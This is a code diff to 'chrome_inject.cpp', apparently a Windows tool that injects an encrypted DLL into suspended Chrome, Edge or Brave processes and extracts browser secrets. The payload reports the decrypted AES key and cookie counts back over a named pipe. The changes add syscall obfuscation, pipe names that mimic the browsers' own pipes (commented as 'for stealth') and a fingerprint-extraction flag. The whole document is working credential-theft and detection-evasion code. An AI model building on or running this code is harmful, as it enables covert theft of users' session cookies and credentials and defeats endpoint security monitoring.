@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.15.0 (c) Alexander 'xaitax' Hagenah
+// v0.16.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -17,6 +17,7 @@
 #include <algorithm>
 
 #include "syscalls.h"
+#include "syscalls_obfuscation.h"
 #define CHACHA20_IMPLEMENTATION
 #include "..\libs\chacha\chacha20.h"
 
@@ -36,7 +37,7 @@
 namespace
 {
     constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
-    constexpr const char *APP_VERSION = "v0.15.0";
+    constexpr const char *APP_VERSION = "v0.16.0";
 
     const uint8_t g_decryptionKey[32] = {
         0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
@@ -59,6 +60,16 @@ namespace
         }
     };
     using UniqueHandle = std::unique_ptr<void, HandleDeleter>;
+
+    struct ModuleDeleter
+    {
+        void operator()(HMODULE h) const
+        {
+            if (h)
+                FreeLibrary(h);
+        }
+    };
+    using UniqueModule = std::unique_ptr<std::remove_pointer<HMODULE>::type, ModuleDeleter>;
 
     namespace Utils
     {
@@ -84,6 +95,64 @@ namespace
             std::ostringstream oss;
             oss << "0x" << std::hex << status;
             return oss.str();
+        }
+
+        std::wstring GenerateBrowserMimicPipeName(const std::wstring &browserType)
+        {
+            DWORD pid = GetCurrentProcessId();
+            DWORD tid = GetCurrentThreadId();
+            DWORD tick = GetTickCount();
+
+            DWORD id1 = (pid ^ tick) & 0xFFFF;
+            DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
+            DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;
+
+            std::wstring pipeName = L"\\\\.\\pipe\\";
+
+            std::wstring browserLower = browserType;
+            std::transform(browserLower.begin(), browserLower.end(), browserLower.begin(), ::towlower);
+
+            if (browserLower == L"chrome")
+            {
+                static const wchar_t *chromePatterns[] = {
+                    L"chrome.sync.%u.%u.%04X",
+                    L"chrome.nacl.%u_%04X",
+                    L"mojo.%u.%u.%04X.chrome"};
+                int patternIdx = (id1 + id2) % 3;
+                wchar_t buffer[128];
+                swprintf_s(buffer, chromePatterns[patternIdx], id1, id2, id3);
+                pipeName += buffer;
+            }
+            else if (browserLower == L"edge")
+            {
+                static const wchar_t *edgePatterns[] = {
+                    L"msedge.sync.%u.%u",
+                    L"msedge.crashpad_%u_%04X",
+                    L"LOCAL\\msedge_%u"};
+                int patternIdx = (id2 + id3) % 3;
+                wchar_t buffer[128];
+                swprintf_s(buffer, edgePatterns[patternIdx], id1, id2);
+                pipeName += buffer;
+            }
+            else if (browserLower == L"brave")
+            {
+                static const wchar_t *bravePatterns[] = {
+                    L"brave.sync.%u.%u",
+                    L"mojo.%u.%u.brave",
+                    L"brave.crashpad_%u"};
+                int patternIdx = (id3) % 3;
+                wchar_t buffer[128];
+                swprintf_s(buffer, bravePatterns[patternIdx], id1, id2);
+                pipeName += buffer;
+            }
+            else
+            {
+                wchar_t buffer[128];
+                swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
+                pipeName += buffer;
+            }
+
+            return pipeName;
         }
 
         std::wstring GenerateUniquePipeName()
@@ -141,6 +210,7 @@ public:
                    << L"Options:\n"
                    << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                    << L"  --verbose|-v             Enable verbose debug output from the injector\n"
+                   << L"  --fingerprint|-f         Extract browser fingerprinting data\n"
                    << L"  --help|-h                Show this help message\n\n"
                    << L"Browser targets:\n"
                    << L"  chrome  - Extract from Google Chrome\n"
@@ -282,7 +352,7 @@ private:
 
         if (!NT_SUCCESS(status))
         {
-            if (status != (NTSTATUS)0xC0000034) // STATUS_OBJECT_NAME_NOT_FOUND
+            if (status != (NTSTATUS)0xC0000034)
                 m_console.Debug("Registry access failed: " + Utils::NtStatusToString(status));
             return L"";
         }
@@ -341,11 +411,45 @@ private:
 struct Configuration
 {
     bool verbose = false;
+    bool extractFingerprint = false;
     fs::path outputPath;
     std::wstring browserType;
     std::wstring browserProcessName;
     std::wstring browserDefaultExePath;
     std::string browserDisplayName;
+
+    bool Validate(const Console &console) const
+    {
+        if (browserDefaultExePath.empty())
+        {
+            console.Error("Browser executable path is empty");
+            return false;
+        }
+
+        if (!fs::exists(browserDefaultExePath))
+        {
+            console.Error("Browser executable not found: " + Utils::WStringToUtf8(browserDefaultExePath));
+            console.Info("Please ensure " + browserDisplayName + " is properly installed");
+            return false;
+        }
+
+        if (!fs::is_regular_file(browserDefaultExePath))
+        {
+            console.Error("Browser path is not a valid executable file");
+            return false;
+        }
+
+        std::error_code ec;
+        fs::create_directories(outputPath, ec);
+        if (ec)
+        {
+            console.Error("Cannot create or access output directory: " + outputPath.u8string());
+            console.Error("Error: " + ec.message());
+            return false;
+        }
+
+        return true;
+    }
 
     static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
     {
@@ -357,6 +461,8 @@ struct Configuration
             std::wstring_view arg = argv[i];
             if (arg == L"--verbose" || arg == L"-v")
                 config.verbose = true;
+            else if (arg == L"--fingerprint" || arg == L"-f")
+                config.extractFingerprint = true;
             else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
                 customOutputPath = argv[++i];
             else if (arg == L"--help" || arg == L"-h")
@@ -408,6 +514,9 @@ struct Configuration
         config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
         config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
 
+        if (!config.Validate(console))
+            return std::nullopt;
+
         return config;
     }
 };
@@ -444,6 +553,9 @@ public:
         {
             m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
             NtTerminateProcess_syscall(m_hProcess.get(), 0);
+
+            WaitForSingleObject(m_hProcess.get(), 2000);
+
             m_console.Debug(m_config.browserDisplayName + " terminated by injector.");
         }
     }
@@ -532,26 +644,30 @@ public:
             throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
 
         m_console.Debug("Payload connected to named pipe.");
+
+        Sleep(200);
     }
 
-    void sendInitialData(bool isVerbose, const fs::path &outputPath)
+    void sendInitialData(bool isVerbose, bool extractFingerprint, const fs::path &outputPath)
     {
         writeMessage(isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
+        Sleep(10);
+        writeMessage(extractFingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
+        Sleep(10);
         writeMessage(outputPath.u8string());
+        Sleep(10);
     }
 
     void relayMessages()
     {
         m_console.Debug("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");
 
-        if (m_console.m_verbose)
-            std::cout << std::endl;
-
         const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
         DWORD startTime = GetTickCount();
         std::string accumulatedData;
         char buffer[4096];
         bool completed = false;
+        bool displayedNewline = false;
 
         while (!completed && (GetTickCount() - startTime < DLL_COMPLETION_TIMEOUT_MS))
         {
@@ -596,6 +712,12 @@ public:
 
                 parseExtractionMessage(message);
 
+                if (!displayedNewline && m_console.m_verbose && !message.empty())
+                {
+                    std::cout << std::endl;
+                    displayedNewline = true;
+                }
+
                 if (!message.empty() && m_console.m_verbose)
                     m_console.Relay(message);
             }
@@ -604,7 +726,7 @@ public:
             accumulatedData.erase(0, messageStart);
         }
 
-        if (m_console.m_verbose)
+        if (m_console.m_verbose && displayedNewline)
             std::cout << std::endl;
 
         m_console.Debug("Payload signaled completion or pipe interaction ended.");
@@ -626,7 +748,6 @@ private:
 
     void parseExtractionMessage(const std::string &message)
     {
-        // Helper lambda to extract numeric value from pattern
         auto extractNumber = [&message](const std::string &prefix, const std::string &suffix) -> int
         {
             size_t start = message.find(prefix);
@@ -646,15 +767,12 @@ private:
             }
         };
 
-        // Parse profile count
         if (message.find("Found ") != std::string::npos && message.find("profile(s)") != std::string::npos)
             m_stats.profileCount = extractNumber("Found ", " profile(s)");
 
-        // Parse AES key
         if (message.find("Decrypted AES Key: ") != std::string::npos)
             m_stats.aesKey = message.substr(message.find("Decrypted AES Key: ") + 19);
 
-        // Parse extraction counts
         if (message.find(" cookies extracted to ") != std::string::npos)
             m_stats.totalCookies += extractNumber("[*] ", " cookies");
 
@@ -817,7 +935,6 @@ private:
     std::vector<BYTE> m_decryptedDllPayload;
 };
 
-// Helper function to build extraction summary string
 std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats &stats)
 {
     std::stringstream summary;
@@ -906,14 +1023,15 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &conf
     TargetProcess target(config, console);
     target.createSuspended();
 
-    PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
+    // Use browser-specific pipe name mimicry for stealth
+    PipeCommunicator pipe(Utils::GenerateBrowserMimicPipeName(config.browserType), console);
     pipe.create();
 
     InjectionManager injector(target, console);
     injector.execute(pipe.getName());
 
     pipe.waitForClient();
-    pipe.sendInitialData(config.verbose, config.outputPath);
+    pipe.sendInitialData(config.verbose, config.extractFingerprint, config.outputPath);
     pipe.relayMessages();
 
     target.terminate();
@@ -960,7 +1078,7 @@ void DisplayExtractionSummary(const std::string &browserName, const PipeCommunic
     }
 }
 
-void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &outputPath)
+void ProcessAllBrowsers(const Console &console, bool verbose, bool extractFingerprint, const fs::path &outputPath)
 {
     if (verbose)
         console.Info("Starting multi-browser extraction...");
@@ -986,11 +1104,11 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
         Configuration config;
         config.verbose = verbose;
+        config.extractFingerprint = extractFingerprint;
         config.outputPath = outputPath;
         config.browserType = browserType;
         config.browserDefaultExePath = browserPath;
 
-        // Map browser type to process name
         static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
             {L"chrome", {L"chrome.exe", "Chrome"}},
             {L"edge", {L"msedge.exe", "Edge"}},
@@ -1043,22 +1161,29 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
         }
     }
 
-    std::cout << std::endl;
+    if (!verbose)
+    {
+        std::cout << std::endl;
+        std::cout.flush();
+    }
     console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
+    std::cout.flush();
 }
 
 int wmain(int argc, wchar_t *argv[])
 {
     bool isVerbose = false;
+    bool extractFingerprint = false;
     std::wstring browserTarget;
     fs::path outputPath;
 
-    // Parse arguments
     for (int i = 1; i < argc; ++i)
     {
         std::wstring_view arg = argv[i];
         if (arg == L"--verbose" || arg == L"-v")
             isVerbose = true;
+        else if (arg == L"--fingerprint" || arg == L"-f")
+            extractFingerprint = true;
         else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
             outputPath = argv[++i];
         else if (arg == L"--help" || arg == L"-h")
@@ -1080,7 +1205,7 @@ int wmain(int argc, wchar_t *argv[])
         return 0;
     }
 
-    if (!InitializeSyscalls(isVerbose))
+    if (!InitializeSyscalls(isVerbose, true))
     {
         console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
         return 1;
@@ -1101,7 +1226,7 @@ int wmain(int argc, wchar_t *argv[])
     {
         try
         {
-            ProcessAllBrowsers(console, isVerbose, outputPath);
+            ProcessAllBrowsers(console, isVerbose, extractFingerprint, outputPath);
         }
         catch (const std::exception &e)
         {
@@ -1123,9 +1248,14 @@ int wmain(int argc, wchar_t *argv[])
             auto stats = RunInjectionWorkflow(*optConfig, console);
 
             if (!isVerbose)
+            {
                 DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
+                std::cout.flush();
+            }
             else
-                console.Success("\nExtraction completed successfully");
+            {
+                console.Success("Extraction completed successfully");
+            }
         }
         catch (const std::runtime_error &e)
         {
@@ -1134,6 +1264,6 @@ int wmain(int argc, wchar_t *argv[])
         }
     }
 
-    console.Debug("Injector finished successfully.");
+    std::cout.flush();
     return 0;
 }
